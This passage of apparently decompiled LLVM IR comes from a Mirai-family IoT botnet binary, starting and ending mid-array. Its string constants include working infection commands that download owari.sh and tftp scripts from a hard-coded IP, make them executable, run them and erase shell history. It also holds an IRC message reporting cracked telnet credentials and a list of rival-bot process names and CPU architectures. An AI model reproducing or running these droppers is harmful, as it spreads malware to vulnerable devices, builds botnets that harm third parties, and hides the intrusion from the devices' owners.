0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_36780.255, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_36914.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36798.257, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_36920.300, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36938.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36944.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368fc.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3694c.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_36954.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36850.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36964.306, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36988.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36890.284, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36990.311, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36998.312, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36754.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3687c.282, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_367a8.259, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3673c.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* bitcast (i32* @global_var_367b4.260 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_369a4.313, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_368e0.293, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3682c.273, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369b0.314, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36744.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_368a4.286, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_36914.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3674c.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36870.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36930.301, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36860.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367a0.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36938.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36888.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_367c8.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36944.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368fc.296, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3694c.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_36954.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36850.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36868.280, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36964.306, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36760.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36820.272, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_367f4.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_36898.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36978.308, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36834.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36980.309, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_367e4.266, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36970.307, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_367d0.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_368d8.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_368c0.289, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36988.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369b8.315, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_369c0.316, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_369c8.317, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_369d4.318, i32 0, i32 0)]
@global_var_45328.669 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36a3c.646, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36a44.647, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_36a4c.648, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_36a58.649, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_36a60.650, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_36a68.651, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_36a70.652, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35630.632, i32 0, i32 0), i8* bitcast (i32* @global_var_36a74.633 to i8*), i8* bitcast (i32* @global_var_36a78.634 to i8*)]
@global_var_53710.671 = local_unnamed_addr global i32 0
@global_var_385f0.673 = constant [52 x i8] c"PRIVMSG %s :[TELNET-GIGANET] CRACKED - %s:23 %s:%s\0A\00"
@global_var_38624.675 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_3862c.677 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_35208.679 = constant [379 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://23.239.64.5/owari.sh || curl -O http://23.239.64.5/owari.sh; chmod 777 owari.sh; sh owari.sh; busybox tftp 23.239.64.5 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 23.239.64.5; chmod 777 tftp2.sh; sh tftp2.sh;; rm -rf *.sh; history -c; history -w; rm -rf ~/.bash_history\00"
@global_var_35384.680 = constant [147 x i8] c"cd /tmp/; wget http://23.239.64.5/owari.sh; sh owari.sh; rm -rf owari.sh; cd /tmp/; wget http://23.239.64.5/owari.sh; sh owari.sh; rm -rf owari.sh\00"
@global_var_35418.681 = constant [8 x i8] c"mirai.*\00"
@global_var_35420.682 = constant [10 x i8] c"dlr.*mips\00"
@global_var_3542c.683 = constant [7 x i8] c"mips64\00"
@global_var_35434.684 = constant [7 x i8] c"mipsel\00"
@global_var_3543c.685 = constant [6 x i8] c"sh2eb\00"
@global_var_35444.686 = constant [7 x i8] c"sh2elf\00"
@global_var_3544c.687 = constant [4 x i8] c"sh4\00"
@global_var_35450.688 = constant [4 x i8] c"x86\00"
@global_var_35454.689 = constant [4 x i8] c"arm\00"
@global_var_35458.690 = constant [6 x i8] c"armv5\00"
@global_var_35460.691 = constant [8 x i8] c"armv4tl\00"
@global_var_35468.692 = constant [6 x i8] c"armv4\00"
@global_var_35470.693 = constant [6 x i8] c"armv6\00"
@global_var_35478.694 = constant [5 x i8] c"i686\00"
@global_var_35480.695 = constant [8 x i8] c"powerpc\00"
@global_var_35488.696 = constant [13 x i8] c"powerpc440fp\00"
@global_var_35498.697 = constant [5 x i8] c"i586\00"
@global_var_354a0.698 = constant [5 x i8] c"m68k\00"
@global_var_354a8.699 = constant [6 x i8] c"sparc\00"
@global_var_354b0.700 = constant [7 x i8] c"x86_64\00"
@global_var_354b8.701 = constant [8 x i8] c"jackmy*\00"
@global_var_354c0.702 = constant [8 x i8] c"hackmy*\00"
@global_var_354c8.703 = constant [3 x i8] c"b1\00"
@global_var_354cc.704 = constant [3 x i8] c"b2\00"
@global_var_354d0.705 = constant [3 x i8] c"b3\00"
@global_var_354d4.706 = constant [3 x i8] c"b4\00"
@global_var_354d8.707 = constant [3 x i8] c"b5\00"
@global_var_354dc.708 = constant [3 x i8] c"b6\00"
@global_var_354e0.709 = constant [3 x i8] c"b7\00"
@global_var_354e4.710 = constant [3 x i8] c"b8\00"
@global_var_354e8.711 = constant [3 x i8] c"b9\00"
@global_var_354ec.712 = constant [4 x i8] c"b10\00"
@global_var_354f0.713 = constant [4 x i8] c"b11\00"
@global_var_354f4.714 = constant [4 x i8] c"b12\00"
@global_var_354f8.715 = constant [4 x i8] c"b13\00"
@global_var_354fc.716 = constant [4 x i8] c"b14\00"
@global_var_35500.717 = constant [4 x i8] c"b15\00"
@global_var_35504.718 = constant [4 x i8] c"b16\00"
@global_var_35508.719 = constant [4 x i8] c"b17\00"
@global_var_3550c.720 = constant [4 x i8] c"b18\00"
@global_var_35510.721 = constant [4 x i8] c"b19\00"
@global_var_35514.722 = constant [4 x i8] c"b20\00"
@global_var_35518.723 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_3552c.724 = constant [10 x i8] c"dvrHelper\00"
@global_var_35538.725 = constant [5 x i8] c"kmy*\00"
@global_var_35540.726 = constant [5 x i8] c"lol*\00"
@global_var_35548.727 = constant [8 x i8] c"telmips\00"
@global_var_35550.728 = constant [10 x i8] c"telmips64\00"
@global_var_3555c.729 = constant [10 x i8] c"telmipsel\00"
@global_var_35568.730 = constant [9 x i8] c"telsh2eb\00"
@global_var_35574.731 = constant [10 x i8] c"telsh2elf\00"
@global_var_35580.732 = constant [7 x i8] c"telsh4\00"
@global_var_35588.733 = constant [7 x i8] c"telx86\00"
@global_var_35590.734 = constant [9 x i8] c"telarmv5\00"
@global_var_3559c.735 = constant [11 x i8] c"telarmv4tl\00"
@global_var_355a8.736 = constant [9 x i8] c"telarmv4\00"
@global_var_355b4.737 = constant [9 x i8] c"telarmv6\00"
@global_var_355c0.738 = constant [8 x i8] c"teli686\00"
@global_var_355c8.739 = constant [11 x i8] c"telpowerpc\00"
@global_var_355d4.740 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_355e4.741 = constant [8 x i8] c"teli586\00"
@global_var_355ec.742 = constant [8 x i8] c"telm68k\00"
@global_var_355f4.743 = constant [9 x i8] c"telsparc\00"
@global_var_35600.744 = constant [10 x i8] c"telx86_64\00"
@global_var_3560c.745 = constant [9 x i8] c"TwoFace*\00"
@global_var_35618.746 = constant [5 x i8] c"xxb*\00"
@global_var_35620.747 = constant [3 x i8] c"bb\00"
@global_var_35624.748 = constant [11 x i8] c"busybotnet\00"
@global_var_35638.749 = constant [7 x i8] c"badbox\00"
@global_var_35640.750 = constant [3 x i8] c"B1\00"
@global_var_35644.751 = constant [3 x i8] c"B2\00"
@global_var_35648.752 = constant [3 x i8] c"B3\00"
@global_var_3564c.753 = constant [3 x i8] c"B4\00"
@global_var_35650.754 = constant [3 x i8] c"B5\00"
@global_var_35654.755 = constant [3 x i8] c"B6\00"
@global_var_35658.756 = constant [3 x i8] c"B7\00"
@global_var_3565c.757 = constant [3 x i8] c"B8\00"
@global_var_35660.758 = constant [3 x i8] c"B9\00"
@global_var_35664.759 = constant [4 x i8] c"B10\00"
@global_var_35668.760 = constant [4 x i8] c"B11\00"
@global_var_3566c.761 = constant [4 x i8] c"B12\00"
@global_var_35670.762 = constant [4 x i8] c"B13\00"
@global_var_35674.763 = constant [4 x i8] c"B14\00"
@global_var_35678.764 = constant [4 x i8] c"B15\00"
@global_var_3567c.765 = constant [4 x i8] c"B16\00"
@global_var_35680.766 = constant [4 x i8] c"B17\00"
@global_var_35684.767 = constant [4 x i8] c"B18\00"
@global_var_35688.768 = constant [4 x i8] c"B20\00"
@global_var_3568c.769 = constant [7 x i8] c"gaybot\00"
@global_var_35694.770 = constant [6 x i8] c"hackz\00"
@global_var_3569c.771 = constant [5 x i8] c"bin*\00"
@global_var_356a4.772 = constant [5 x i8] c"gtop\00"
@global_var_356ac.773 = constant [7 x i8] c"botnet\00"
@global_var_356b4.774 = constant [8 x i8] c"swatnet\00"
@global_var_356bc.775 = constant [8 x i8] c"ballpit\00"
@global_var_356c4.776 = constant [8 x i8] c"fucknet\00"
@global_var_356cc.777 = constant [9 x i8] c"cracknet\00"
@global_var_356d8.778 = constant [8 x i8] c"weednet\00"
@global_var_356e0.779 = constant [7 x i8] c"gaynet\00"
@global_var_356e8.780 = constant [9 x i8] c"queernet\00"
@global_var_356f4.781 = constant [8 x i8] c"ballnet\00"
@global_var_356fc.782 = constant [5 x i8] c"unet\00"
@global_var_35704.783 = constant [7 x i8] c"yougay\00"
@global_var_3570c.784 = constant [7 x i8] c"sttftp\00"
@global_var_35714.785 = constant [7 x i8] c"sstftp\00"
@global_var_3571c.786 = constant [7 x i8] c"sbtftp\00"
@global_var_35724.787 = constant [6 x i8] c"btftp\00"
@global_var_3572c.788 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_35738.789 = constant [6 x i8] c"bruv*\00"
@global_var_35740.790 = constant [5 x i8] c"IoT*\00"
@global_var_35748.791 = constant [6 x i8] c"kawi*\00"
@global_var_35750.792 = constant [6 x i8] c"kiwi*\00"
@global_var_35758.793 = constant [8 x i8] c"botgod*\00"
@global_var_44ae8.794 = local_unnamed_addr global [116 x i8*] [i8* getelementptr inbounds ([379 x i8], [379 x i8]* @global_var_35208.679, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_35384.680, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35418.681, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_35420.682, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3542c.683, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35434.684, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3543c.685, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35444.686, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3544c.687, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35450.688, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35454.689, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35458.690, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35460.691, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35468.692, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35470.693, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35478.694, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35480.695, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_35488.696, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35498.697, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_354a0.698, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_354a8.699, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_354b0.700, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_354b8.701, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_354c0.702, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354c8.703, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354cc.704, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354d0.705, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354d4.706, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354d8.707, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354dc.708, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354e0.709, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354e4.710, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_354e8.711, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354ec.712, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354f0.713, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354f4.714, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354f8.715, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_354fc.716, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35500.717, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35504.718, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35508.719, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3550c.720, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35510.721, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35514.722, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_35518.723, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_3552c.724, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35538.725, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35540.726, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35548.727, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_35550.728, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_3555c.729, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_35568.730, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_35574.731, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35580.732, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35588.733, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_35590.734, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_3559c.735, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_355a8.736, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_355b4.737, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_355c0.738, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_355c8.739, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_355d4.740, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_355e4.741, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_355ec.742, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_355f4.743, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_35600.744, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_3560c.745, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_35618.746, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35620.747, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_35624.748, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_35630.632, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_35638.749, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35640.750, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35644.751, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35648.752, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_3564c.753, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35650.754, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35654.755, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35658.756, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_3565c.757, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_35660.758, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35664.759, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35668.760, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3566c.761, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35670.762, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35674.763, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35678.764, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_3567c.765, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35680.766, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35684.767, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_35688.768, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3568c.769, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_35694.770, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_3569c.771, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_356a4.772, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_356ac.773, i32 0, i32 0), i8* getelementptr inbounds ([8 x 